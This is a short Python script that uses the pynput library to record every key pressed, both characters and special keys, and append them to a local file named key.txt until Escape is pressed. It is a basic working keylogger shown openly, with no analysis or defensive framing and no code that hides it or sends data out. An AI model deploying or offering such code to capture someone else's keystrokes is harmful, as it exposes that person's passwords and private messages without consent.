from pynput import keyboard #calling the keyboard leader function

output_file = "key.txt"


def press(key):
    try:
        with open(output_file, "a") as f:
            f.write(f"{key.char}") # Record key pressed
    except AttributeError:
        with open(output_file, "a") as f:
            f.write(f"[{key}]") # Record special keys

def release(key):
    if key == keyboard.Key.esc: # Stop the key reading
        return False


with keyboard.Listener(on_press=press, on_release=release) as listener:
        listener.join()

